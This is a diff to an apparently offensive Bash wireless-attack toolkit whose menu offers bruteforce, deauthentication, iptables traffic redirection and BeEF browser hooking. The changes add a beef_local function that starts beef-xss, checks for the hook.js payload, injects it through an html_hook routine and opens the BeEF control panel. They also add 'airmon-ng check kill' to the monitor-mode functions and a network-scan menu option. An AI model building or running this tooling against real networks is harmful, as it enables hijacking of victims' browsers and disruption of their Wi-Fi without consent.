@@ -33,6 +33,7 @@ intro(){
 
 SELECTED_INTERFACE=""
 MON_INTERFACE=""
+INTERFACE_INTERNET_OUTPUT=""
 
 MAIN_DIRECTORTY=`pwd`
 
@@ -150,6 +151,8 @@ monitor_mode(){
 
     else
         echo "[+] Activating monitor mode in $SELECTED_INTERFACE..."
+        #Verifica que no hayan procesos que interfieran con aircrack-ng
+        sudo airmon-ng check kill &>/dev/null 
         sudo airmon-ng start "$SELECTED_INTERFACE" &>/dev/null
         
         # Verificar si la interfaz en modo monitor se creó
@@ -170,7 +173,8 @@ manager_mode(){
     
     if echo "$MON_INTERFACE" | grep -q "mon"; then
         echo "[+] Disabling monitor mode in $MON_INTERFACE..."
-        
+        #Verifica que no hayan procesos que interfieran con aircrack-ng
+        sudo airmon-ng check kill &>/dev/null 
         sudo airmon-ng stop "$MON_INTERFACE" &>/dev/null
 
         if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
@@ -441,7 +445,6 @@ Bruteforce(){
     
 }
 
-IP="127.0.0.1"
 IP_HOOK=""
 
 iptables_redirect_traffic(){
@@ -497,7 +500,38 @@ beef_hosted() {
     
     html_hook & 
 
-    # firefox --browser   --new-window 192.168.3.118:3000/ui/panel
+    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+        firefox --browser   --new-window $IP_HOOK:3000/ui/panel
+    else
+        echo "You are not on graphic terminal we can't open beef panel"
+    fi
+
+}
+
+beef_local() {
+    
+    IP_HOOK="127.0.0.1"
+
+    sudo beef-xss
+    sleep 2
+    
+    if wget $IP_HOOK:3000/hook.js ; then  
+        echo "Found hook on $IP_HOOK" 
+    else
+        echo "We haven't found the $IP_HOOK:3000/hook.js\n"
+        echo "Make sure its avaliable the port and the hook.js on that server"
+        return 1
+    fi
+
+    rm hook.js
+    
+    html_hook & 
+
+    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+        firefox --browser   --new-window $IP_HOOK:3000/ui/panel
+    else
+        echo "You are not on graphic terminal we can't open beef panel"
+    fi
 
 }
 
@@ -625,7 +659,7 @@ menu(){
             5) Bruteforce ;;
             6) echo ""; hostname -I ;;
             7) Deauther "0" ;;
-            8) echo ""; uptime ;;
+            8) ./netscan.py ;;
             9) beef_menu ;;
             0) echo "👋 Goodbye..."; exit 0 ;;
             *) echo "❌ Not valid option." ; sleep 2 ;;
